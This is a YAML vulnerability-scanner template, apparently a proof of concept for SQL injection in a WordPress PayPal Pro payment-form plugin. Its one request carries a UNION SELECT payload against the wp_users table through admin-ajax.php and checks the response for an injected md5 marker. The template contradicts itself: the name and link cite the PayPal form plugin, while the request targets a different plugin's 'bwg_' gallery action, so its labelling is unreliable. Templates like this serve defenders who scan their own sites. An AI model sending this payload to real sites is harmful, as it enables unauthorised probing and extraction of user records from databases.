name: poc-yaml-wordpress-paypal-pro-cve-2020-14092-sqli
manual: true
transport: http
set:
    num: string(randomInt(10000, 99999))
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0[]=)%22%20union%20select%201,2,3,4,5,6,7,md5({{num}}),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20from%20wp_users%20--%20g
        expression: response.status == 200 && response.body_string.contains(md5(num))
expression: r0()
detail:
    author: Editor
    links:
        - https://wordpress.dwbooster.com/forms/payment-form-for-paypal-pro
    vulnerability:
        id: CT-70843
        level: critical
